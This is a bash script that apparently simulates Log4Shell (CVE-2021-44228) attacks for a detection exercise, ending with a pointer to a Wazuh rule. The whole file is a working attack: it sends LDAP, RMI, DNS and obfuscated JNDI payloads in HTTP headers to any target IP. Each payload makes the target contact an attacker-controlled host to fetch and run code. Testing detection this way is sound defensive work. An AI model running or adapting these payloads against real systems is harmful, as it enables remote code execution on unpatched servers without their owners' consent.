#!/bin/bash
# ============================================================
# Project Sentinel — Log4Shell Simulation Script
# CVE-2021-44228 | MITRE T1190
# Assignee: Yusmadani Firmansyah
# ============================================================

TARGET="${1:-192.168.10.30}"
ATTACKER="${2:-100.82.107.52}"
OUTPUT="/tmp/sentinel_evidence/log4shell/$(date +%Y%m%d_%H%M%S)"

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${CYAN}======================================${NC}"
echo -e "${CYAN}  Log4Shell Simulation - CVE-2021-44228${NC}"
echo -e "${CYAN}  Target  : $TARGET${NC}"
echo -e "${CYAN}  Attacker: $ATTACKER${NC}"
echo -e "${CYAN}======================================${NC}"

mkdir -p "$OUTPUT"

echo -e "\n${YELLOW}[1/5] Basic JNDI LDAP payload...${NC}"
curl -s -v \
  -H "X-Api-Version: \${jndi:ldap://$ATTACKER/exploit}" \
  "http://$TARGET/" >> "$OUTPUT/log4shell.txt" 2>&1
echo -e "${GREEN}Done${NC}"
sleep 2

echo -e "\n${YELLOW}[2/5] JNDI dalam User-Agent...${NC}"
curl -s -v \
  -A "\${jndi:ldap://$ATTACKER/a}" \
  "http://$TARGET/" >> "$OUTPUT/log4shell.txt" 2>&1
echo -e "${GREEN}Done${NC}"
sleep 2

echo -e "\n${YELLOW}[3/5] JNDI RMI payload...${NC}"
curl -s -v \
  -H "X-Api-Version: \${jndi:rmi://$ATTACKER:1099/exploit}" \
  "http://$TARGET/" >> "$OUTPUT/log4shell.txt" 2>&1
echo -e "${GREEN}Done${NC}"
sleep 2

echo -e "\n${YELLOW}[4/5] JNDI DNS payload...${NC}"
curl -s -v \
  -H "X-Api-Version: \${jndi:dns://$ATTACKER/exploit}" \
  "http://$TARGET/" >> "$OUTPUT/log4shell.txt" 2>&1
echo -e "${GREEN}Done${NC}"
sleep 2

echo -e "\n${YELLOW}[5/5] Obfuscated JNDI payload...${NC}"
curl -s -v \
  -H "X-Api-Version: \${j\${::-n}di:ldap://$ATTACKER/exploit}" \
  "http://$TARGET/" >> "$OUTPUT/log4shell.txt" 2>&1
echo -e "${GREEN}Done${NC}"

echo -e "\n${GREEN}======================================${NC}"
echo -e "${GREEN}Simulasi selesai!${NC}"
echo -e "${GREEN}Evidence: $OUTPUT${NC}"
echo -e "${GREEN}======================================${NC}"
echo ""
echo -e "${CYAN}Cek Wazuh Dashboard:${NC}"
echo -e "${CYAN}  rule.id: 100800 atau rule.groups: log4shell${NC}"
